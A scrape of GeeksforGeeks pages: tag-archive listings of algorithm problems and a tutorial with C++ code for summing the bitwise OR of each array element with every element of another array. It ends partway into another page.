sorted array arr[] consisting of N distinct elements, the task is to find the maximum possible common difference of an arithmetic progression such… Read More » ArraysGreedyMathematicalarithmetic progressionArithmetic ProgressionsMaths Smallest number whose sum of digits is N and every digit occurring at most K times Last Updated: 20-12-2020 Given two positive integers N and K, the task is to find the smallest number whose sum of digits is N and every distinct digit… Read More » GreedyMathematicalnumber-digitsNumbers Queries to check if sweets of given type can be eaten on given day or not Last Updated: 19-12-2020 5 Given two arrays A[ ] and B[ ] consisting of N integers, where Ai denotes the quantity of sweets of the ith type and Bi… Read More » ArraysGreedyMathematicalSortingarray-range-queriescpp-paircpp-vector Minimum sum of values subtracted from array elements to make all array elements equal Last Updated: 18-12-2020 Given an array arr[] consisting of N positive integers, the task is to find the sum of all the array elements required to be subtracted… Read More » ArraysGreedyMathematicalarray-rearrange Smallest positive number made up of non-repeating digits whose sum of digits is N Last Updated: 21-12-2020 Given a positive integer N, the task is to find the smallest positive number made up of distinct digits having sum of its digits equal… Read More » GreedyMathematicalPattern SearchingStringsnumber-digitsNumbers Minimum Deci-Binary numbers required to obtain a given sum S Last Updated: 18-12-2020 Given a numeric string S representing a positive decimal integer, the task is to find the minimum number of positive Deci-Binary numbers required to obtain… Read More » GreedyMathematicalPattern SearchingSearchingbinary-representationnumber-digits Count pair of integers having even sum Last Updated: 17-12-2020 Given two integers N and M, the task is to count all possible pair of integers (i, j) (1 ≤ i ≤ N, 1 ≤… Read More » GreedyMathematicalTechnical ScripterNumbersTechnical Scripter 2020 Maximum of even or odd product pairs count from given arrays Last Updated: 18-12-2020 Given two arrays A[] and B[] consisting of N integers, the task is to count pairs (A[i], B[j]) with even and odd product and print… Read More » ArraysGreedyMathematicalfrequency-counting Maximum number of times a given string needs to be concatenated to form a substring of another string Last Updated: 18-12-2020 3 Given two strings S1 and S2 of length N and M respectively, the task is to find the maximum value of times the string S2… Read More » GreedyPattern SearchingStringssubstring Generate an N-length string having longest palindromic substring of length K Last Updated: 18-12-2020 Given two intgers N and K (K ≤ N), the task is to obtain a string of length N such that maximum length of a… Read More » GreedyStringspalindromesubstring Last remaining character after repeated removal of the first character and flipping of characters of a Binary String Last Updated: 15-12-2020 1 Given a Binary string str of length N, the task is to find the last character removed from the string by repeatedly removing the first… Read More » GreedyPattern SearchingStringsbinary-stringstrings Count pairs with Even Product from two given arrays Last Updated: 15-12-2020 Given two arrays, arr[] and brr[] of size N and M respectively, the task is to find the count of pairs (arr[i], brr[j]) such that… Read More » ArraysGreedyMathematicalSearchingfrequency-counting Print all array elements appearing more than N / K times Last Updated: 15-12-2020 Given an array arr[] of size N and an integer K, the task is to find all the array elements that appear more than (N… Read More » ArraysC++ ProgramsDivide and ConquerGreedyHashSortingArraysBinary Searchcpp-map Page 1 of 6912345...102030...»Last » Most popular in Greedy Proof that traveling salesman problem is NP Hard3 Different ways to print Fibonacci series in JavaGreedy approach vs Dynamic programmingFind the sum of digits of a number at even and odd placesMax Flow Problem Introduction Most Visited in Greedy Maximum number of customers that can be satisfied with given quantityOptimal Page Replacement AlgorithmFind maximum meetings in one roomProgram for First Fit algorithm in Memory ManagementFind the minimum and maximum amount to buy all N candies room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

number-digits Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write a program to reverse digits of a numberProgram to count digits in an integer (4 Different Methods)Program for Sum of the digits of a given numberFind next greater number with same set of digitsFind first and last digits of a numberCompute sum of digits in all numbers from 1 to nFinding sum of digits of a number until sum becomes single digitCount of n digit numbers whose sum of digits equals to given sumSum of digit of a number using recursionReplace all ‘0’ with ‘5’ in an input IntegerFind the smallest number whose digits multiply to a given number nCount even and odd digits in an IntegerReverse digits of an integer with overflow handledFind the sum of digits of a number at even and odd placesHow to check if string contains only digits in JavaFind smallest number with given number of digits and sum of digitsArrange given numbers to form the biggest number | Set 2Number of occurrences of 2 as a digit in numbers from 0 to nFind maximum number that can be formed using digits of a given numberNumbers having Unique (or Distinct) digitsBuild Lowest Number by Removing n digits from a given numberProgram for Sum of the digits of a given numberC Program to Print all digits of a given numberProgram to Convert Hexadecimal Number to BinaryFind the Number which contain the digit dLargest and smallest digit of a numberCount digits in a factorial | Set 1To check a number is palindrome or not without using any extra spaceSum of all substrings of a string representing a number | Set 1Check if a large number is divisible by 3 or not Tag Archives: number-digits Smallest number greater than or equal to N which is divisible by its non-zero digits Last Updated: 21-12-2020 Given an integer N, the task is to find the smallest number greater than or equal to N such that it is divisible by all… Read More » GreedyMathematicalnumber-digits Count odd and even Binomial Coefficients of N-th power Last Updated: 21-12-2020 Given an integer N, the task is to count the number of even and odd binomial coefficients up to Nth power. Examples: Input: N =… Read More » Bit MagicMathematicalbinomial coefficientnumber-digitssetBitCount Smallest number whose sum of digits is N and every digit occurring at most K times Last Updated: 20-12-2020 Given two positive integers N and K, the task is to find the smallest number whose sum of digits is N and every distinct digit… Read More » GreedyMathematicalnumber-digitsNumbers Smallest positive number made up of non-repeating digits whose sum of digits is N Last Updated: 21-12-2020 Given a positive integer N, the task is to find the smallest positive number made up of distinct digits having sum of its digits equal… Read More » GreedyMathematicalPattern SearchingStringsnumber-digitsNumbers Count digits present in each element of a given Matrix Last Updated: 17-12-2020 Given a matrix arr[][] of dimensions M * N, the task is to count the number of digits of every element present in the given… Read More » MathematicalMatrixSchool Programmingnumber-digits Minimum Deci-Binary numbers required to obtain a given sum S Last Updated: 18-12-2020 Given a numeric string S representing a positive decimal integer, the task is to find the minimum number of positive Deci-Binary numbers required to obtain… Read More » GreedyMathematicalPattern SearchingSearchingbinary-representationnumber-digits Maximize count of distinct strings generated by replacing similar adjacent digits having sum K with K Last Updated: 17-12-2020 3 Given a numeric string S of length N and a digit K, the task is to find the maximum number of distinct strings having a… Read More » MathematicalStringsTechnical Scripternumber-digitsNumbersTechnical Scripter 2020 Smallest number whose product with N has sum of digits equal to that of N Last Updated: 16-12-2020 Given an integer N, the task is to find the smallest positive integer, which when multiplied by N, has sum of digits equal to the… Read More » MathematicalStringsnumber-digitsNumbers Modulus of two Hexadecimal Numbers Last Updated: 17-12-2020 Given two hexadecimal numbers N and K, the task is to find N modulo K. Examples: Input: N = 3E8, K = 13 Output: C Explanation: Decimal representation… Read More » MathematicalStringsModular Arithmeticnumber-digits Count of numbers from range [L, R] whose sum of digits is Y | Set 2 Last Updated: 17-12-2020 2 Given three positive integers L, R and Y, the task is to count the numbers in the range [L, R] whose sum of digits is… Read More » Dynamic ProgrammingMathematicaldigit-DPnumber-digits Count numbers from given range having odd digits at odd places and even digits at even places Last Updated: 09-12-2020 Given two integers L and R, the task is to count numbers from the range [L, R] having odd digits at odd positions and even… Read More » Mathematicalmaths-powerNatural Numbersnumber-digits Count numbers up to N which contains at least one repeated digit Last Updated: 09-12-2020 2 Given an integer N, the task is to count the numbers less than or equal to N such that each number contains at least one… Read More » CombinatorialMathematicalfactorialnumber-digitspermutationReverse Maximum K-digit number possible from subsequences of two given arrays Last Updated: 16-11-2020 4 Given two arrays arr1[] and arr2[] of length M and N consisting of digits [0, 9] representing two numbers and an integer K(K ≤ M… Read More » ArraysDynamic ProgrammingMathematicalRecursionGoogleinterview-preparationnumber-digitssubsequence Count N-digit numbers made up of X or Y whose sum of digits is also made up of X or Y Last Updated: 24-11-2020 Given three positive integers N, X, and Y, the task is to count N-digit numbers containing of X or Y only as digits and the… Read More » Dynamic ProgrammingMathematicalRecursionnumber-digitsNumbers Smallest number greater than or equal to N having sum of digits not exceeding S Last Updated: 06-11-2020 Given integer N and integer S, the task is to find the smallest number greater than or equal to N such that the sum of… Read More » GreedyMathematicalDiscrete Mathematicsnumber-digitsnumber-theoryNumberspython Page 1 of 3212345...102030...»Last » Most popular in number-digits Minimum number with digits as 4 and 7 only and given sumRecursive program to check if number is palindrome or notCount numbers in range [L, R] whose sum of digits is a Prime NumberCount all prime numbers in a given range whose sum of digits is also primeSmallest multiple of a given number made of digits 0 and 9 only Most visited in number-digits Finding number of digits in n'th Fibonacci numberSpecial two digit numberHarshad (Or Niven) NumberFind XOR of all elements in an ArrayHow to store a very large number of more than 100 digits in C++ room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Sum of Bitwise OR of each array element of an array with all elements of another array - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Arrays in JavaWrite a program to reverse an array or stringProgram for array rotationLargest Sum Contiguous SubarrayStack Data Structure (Introduction and Program)Find the smallest and second smallest elements in an arrayArrays in C/C++Sort elements by frequency | Set 1Write a program to reverse an array or stringSubset Sum Problem | DP-25K'th Smallest/Largest Element in Unsorted Array | Set 1Given an array A[] and a number x, check for pair in A[] with sum as xSearch an element in a sorted and rotated arrayCount Inversions in an array | Set 1 (Using Merge Sort)Linear SearchFind subarray with given sum | Set 1 (Nonnegative Numbers)Find the Missing NumberPrint a given matrix in spiral formSliding Window Maximum (Maximum of all subarrays of size k)Linked List vs ArrayQueue | Set 1 (Introduction and Array Implementation)Next Greater ElementStock Buy Sell to Maximize ProfitArray of Strings in C++ (5 Different Ways to Create)Trapping Rain WaterMultidimensional Arrays in JavaSort an array of 0s, 1s and 2sk largest(or smallest) elements in an array | added Min Heap methodPython | Using 2D arrays/lists the right wayUgly Numbers Sum of Bitwise OR of each array element of an array with all elements of another array Last Updated: 21-12-2020 Given two arrays arr1[] of size M and arr2[] of size N, the task is to find the sum of bitwise OR of each element of arr1[] with every element of the array arr2[]. Examples: Input: arr1[] = {1, 2, 3}, arr2[] = {1, 2, 3}, M = 3, N = 3Output: 7 8 9Explanation: For arr[0]: Sum = arr1[0]|arr2[0] + arr1[0]|arr2[1] + arr1[0]|arr2[2], Sum = 1|1 + 1|2 + 1|3 = 7For arr[1], Sum = arr1[1]|arr2[0] + arr1[1]|arr2[1] + arr1[1]|arr2[2], Sum= 2|1 + 2|2 + 2|3 = 8For arr[2], Sum = arr1[2]|arr2[0] + arr1[2]|arr2[1] + arr1[2]|arr2[2], Sum = 3|1 + 3|2 + 3|3 = 9 Input: arr1[] = {2, 4, 8, 16}, arr2[] = {2, 4, 8, 16}, M = 4, N = 4Output: 36 42 54 78 Naive Approach: The simplest0 approach to solve this problem to traverse the array arr1[] and for each array element in the array arr[], calculate Bitwise OR of each element in the array arr2[]. Time Complexity: O(N2)Auxiliary Space: O(N) Efficient Approach: To optimize the above approach, the idea is to use Bit Manipulation to solve the above problem. According to the Bitwise OR property, while performing the operation, the ith bit will be set bit only when either of both numbers has a set bit at the ith position, where 0 ≤ i <32. Therefore, for a number in arr1[], if the ith bit is not a set bit, then the ith place will contribute a sum of K * 2i , where K is the total number in arr2[] having set bit at the ith position. Otherwise, if the number has a set bit at the ith place, then it will contribute a sum of N * 2i. Follow the steps below to solve the problem: Initialize an integer array, say frequency[], to store the count of numbers in arr2[] having set-bit at ith position ( 0 ≤ i < 32). Traverse the array arr2[] and represent each array element in its binary form and increment the count in the frequency[] array by one at the positions having set bit in the binary representations. Traverse the array arr1[]. Initialize an integer variable, say bitwise_OR_sum with 0. Traverse in the range [0, 31] using variable j. If the jth bit is set in the binary representation of arr2[i], then increment bitwise_OR_sum by N * 2j. Otherwise, increment by frequency[j] * 2j Print the sum obtained bitwise_OR_sum. Below is the implementation of the above approach: C++ filter_none edit close play_arrow link brightness_4 code // C++ program for the above approach #include <bits/stdc++.h> using namespace std; // Fucntion to compute sum of Bitwise OR // of each element in arr1[] with all // elements of the array arr2[] void Bitwise_OR_sum_i(int arr1[], int arr2[], int M, int N) { // Decalring an array of // size 32 to store the // count of each bit int frequency[32] = { 0 }; // Traverse the array arr1[] for (int i = 0; i < N; i++) { // Current bit position int bit_position = 0; int num = arr1[i]; // While num exceeds 0 while (num) { // Checks if i-th bit // is set or not if (num & 1) { // Increment the count at // bit_position by one frequency[bit_position] += 1; } // Increment bit_position bit_position += 1; // Right shift the num by one num >>= 1; } } // Traverse in the arr2[] for (int i = 0; i < M; i++) { int num = arr2[i]; // Store the ith bit value int value_at_that_bit = 1; // Total required sum int bitwise_OR_sum = 0; // Traverse in the range [0, 31] for (int bit_position = 0; bit_position < 32; bit_position++) { // Check if current bit is set if (num & 1) { // Incremen the Bitwise // sum by N*(2^i) bitwise_OR_sum += N * value_at_that_bit; } else { bitwise_OR_sum += frequency[bit_position] * value_at_that_bit; } // Right shift num by one num >>= 1; // Left shift valee_at_that_bit by one value_at_that_bit <<= 1; } // Print the sum obtained for ith // number in arr1[] cout << bitwise_OR_sum << ' '; } return; } // Driver Code int main() { // Given arr1[] int arr1[] = { 1, 2, 3 }; // Given arr2[] int arr2[] = { 1, 2, 3 }; // Size of arr1[] int N = sizeof(arr1) / sizeof(arr1[0]); // Size of arr2[] int M = sizeof(arr2) / sizeof(arr2[0]); // Function Call Bitwise_OR_sum_i(arr1, arr2, M, N); return 0; } chevron_right filter_none Output: 7 8 9 Time Complexity: O(N*32)Auxiliary Space: O(N*32) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Form an array of distinct elements with each element as sum of an element from each arrayTotal pairs in an array such that the bitwise AND, bitwise OR and bitwise XOR of LSB is 1Calculate Bitwise OR of two integers from their given Bitwise AND and Bitwise XOR valuesCheck if each element of an Array is the Sum of any two elements of another ArrayMaximize sum of squares of array elements possible by replacing pairs with their Bitwise AND and Bitwise ORSum of product of each element with each element after itLeftover element after performing alternate Bitwise OR and Bitwise XOR operations on adjacent pairsMinimum possible Bitwise OR of all Bitwise AND of pairs generated from two given arraysFind the triplet from given Bitwise XOR and Bitwise AND values of all its pairsNon-negative pairs with sum of Bitwise OR and Bitwise AND equal to NMaximize product of array by replacing array elements with its sum or product with element from another arrayQueries to update each element in subarray to Bitwise XOR with a given valueRearrange array elements such that Bitwise AND of first N - 1 elements is equal to last elementMaximize sum of K elements selected from a Matrix such that each selected element must be preceded by selected row elementsMaximum sum of Array formed by replacing each element with sum of adjacent elementsCheck if Array elements can be maximized upto M by adding all elements from another arrayCount pairs with bitwise XOR exceeding bitwise AND from a given arrayFind subsequences with maximum Bitwise AND and Bitwise ORCount ways to generate pairs having Bitwise XOR and Bitwise AND equal to X and Y respectivelyCount pairs with equal Bitwise AND and Bitwise OR valuenk14646Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : ArraysBit MagicprefixsetBitCount Practice Tags : ArraysBit Magic thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Count odd and even Binomial Coefficients of N-th power Next last_page Sum of Bitwise XOR of each array element with all other array elements Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Arrays Maximum and minimum of an array using minimum number of comparisonsProgram to find largest element in an arrayRemove duplicates from sorted arrayFind Second largest element in an arrayFind duplicates in O(n) time and O(1) extra space | Set 1 Most visited in Bit Magic Bitwise Operators in C/C++Travelling Salesman Problem | Set 1 (Naive and Dynamic Programming)Left Shift and Right Shift Operators in C/C++Cyclic Redundancy Check and Modulo-2 DivisionHow to swap two numbers without using a temporary variable? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

prefix Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Number of subarrays with m odd numbersFind number of triplets in array such that a[i]>a[j]>a[k] and i<j<kCount ways to partition a string such that both parts have equal distinct charactersLongest Common Prefix Matching | Set-6Check if a String starts with any of the given prefixes in JavaSub-strings of a string that are prefix of the same stringSort an array of strings lexicographically based on prefixPrint the longest prefix of the given string which is also the suffix of the same stringCount of strings whose prefix match with the given string to a given length kA Sum Array PuzzlePrint the longest palindromic prefix of a given stringCount the number of common divisors of the given stringsLongest subarray having sum K | Set 2Given an array and two integers l and r, find the kth largest element in the range [l, r]Check if a number starts with another number or notPython program to print the substrings that are prefix of the given stringReplace every element in a circular array by sum of next K elementsMinimum index to split array into subarrays with co-prime productsMinimum number of substrings the given string can be splitted into that satisfy the given conditionsMaximum number of given operations to remove the entire stringCount of occurrences of each prefix in a string using modified KMP algorithmFind the number of occurrences of a character upto preceding positionMinimum cuts required to convert a palindromic string to a different palindromic stringCount of ways to split given string into two non-empty palindromesFind the longest common prefix between two strings after performing swaps on second stringSmallest String consisting of a String S exactly K times as a SubstringMaximize the maximum among minimum of K consecutive sub-arraysLongest string in an array which matches with prefix of the given stringGiven an array and three numbers, maximize (x * a[i]) + (y * a[j]) + (z * a[k])Find an element which divides the array in two subarrays with equal product Tag Archives: prefix Sum of Bitwise OR of each array element of an array with all elements of another array Last Updated: 21-12-2020 Given two arrays arr1[] of size M and arr2[] of size N, the task is to find the sum of bitwise OR of each element… Read More » ArraysBit MagicprefixsetBitCount Check if a string can be converted to another given string by removal of a substring Last Updated: 21-12-2020 Given two strings S and T of length N and M respectively, the task is to check if the string S can be converted to… Read More » SearchingStringsprefixsubstringSuffix Length of the longest subarray whose Bitwise XOR is K Last Updated: 21-12-2020 Given an array arr[] of size N and an integer K, the task is to find the length of the longest subarray having Bitwise XOR… Read More » ArraysBit MagicHashMathematicalBitwise-XORcpp-mapHashprefixsubarray Queries to count minimum flips required to fill a binary submatrix with 0s only Last Updated: 18-12-2020 Given a binary matrix mat[][] of size M * N and Q queries of the form {pi, pj, qi, qj}, the task for each query… Read More » MathematicalMatrixarray-rearrangeprefixprefix-sumsubmatrix Count ways to split array into two equal sum subarrays by changing sign of any one array element Last Updated: 08-12-2020 Given an array arr[] consisting of N integers, the task is to count ways to split array into two subarrays of equal sum by changing… Read More » ArraysGreedyMathematicalSearchingfrequency-countingpartitionprefixprefix-sumsubarraySuffixsuffix-sum Count ways to split array into two subarrays with equal GCD Last Updated: 01-12-2020 Given an array, arr[] of size N, the task is to count the number of ways to split given array elements into two subarrays such… Read More » ArraysMathematicalarray-rearrangeHCFprefixsubarray Smallest string which not a subsequence of the given string Last Updated: 01-12-2020 Given a string str, consisting of lowercase alphabets, the task is to find the shortest string which is not a subsequence of the given string.… Read More » GreedySortingStringscpp-unordered_setFacebookinterview-preparationprefixsubsequence Minimum index to split array into subarrays with co-prime products Last Updated: 17-11-2020 Given an array arr[] consisting of N integers, the task is to find the maximum index K such that the product of subarrays {arr[0], arr[K]}… Read More » ArraysGreedyMathematicalGoldman SachsHCFinterview-preparationpartitionprefixsubarraySuffix-Array Remove Sub-Directories from a File System Last Updated: 23-10-2020 Given an array of strings arr[] consisting of N unique directories in the form of strings, the task is to remove all the subdirectories and… Read More » ArraysSortingStringsprefix Smallest prefix to be deleted such that remaining array can be rearranged to form a sorted array Last Updated: 05-10-2020 Given an array arr[] consisting of N integers, the task is to find the minimum length of the prefix needed to be deleted such that… Read More » ArraysGreedyMathematicalSearchingprefix Replace every element in a circular array by sum of next K elements Last Updated: 29-10-2020 Given a circular array arr[] of N integers and an integer K, the task is to print the array after the following operations: If K… Read More » ArraysMathematicalSearchingprefixprefix-sumsubarray-sum Minimum size substring to be removed to make a given string palindromic Last Updated: 01-11-2020 Given a string S, the task is to print the string after removing the minimum size substring such that S is a palindrome or not.… Read More » GreedyMathematicalSearchingStringspalindromeprefixsubstringSuffix Smallest String consisting of a String S exactly K times as a Substring Last Updated: 16-09-2020 4 Given a string S of length N and integer K, find the smallest length string which contains the string S as a sub string exactly… Read More » Dynamic ProgrammingMathematicalPattern SearchingSearchingStringsprefixsubstringSuffix Sort an array of strings lexicographically based on prefix Last Updated: 10-08-2020 Given an array of strings arr[] of size N, the task is to sort the array of strings in lexicographical order and if while sorting… Read More » ArraysSortingStringslexicographic-orderingprefix Perform range sum queries on string as per given condition Last Updated: 02-11-2020 Given a string S with lowercase alphabets only and Q queries where each query contains a pair {L, R}. For each query {L, R}, there… Read More » ArraysCompetitive ProgrammingStringsprefixprefix-sumsubarraysubarray-sumsubstring Page 1 of 512345» Most popular in prefix Check if a string can be converted to another given string by removal of a substringSmallest string which not a subsequence of the given stringQueries to print the character that occurs the maximum number of times in a given rangeLength of the longest subarray whose Bitwise XOR is KSum of Bitwise OR of each array element of an array with all elements of another array Most visited in prefix Find an integer X which is divisor of all except exactly one element in an arrayRange sum queries for anticlockwise rotations of Array by K indicesQueries to count minimum flips required to fill a binary submatrix with 0s onlyMaximum length palindrome that can be created with characters in range L and RLongest prefix in a string with highest frequency room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Count odd and even Binomial Coefficients of N-th power - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Compute the integer absolute value (abs) without branchingBitwise Operators in C/C++Rotate bits of a numberLeft Shift and Right Shift Operators in C/C++Count set bits in an integerTravelling Salesman Problem | Set 1 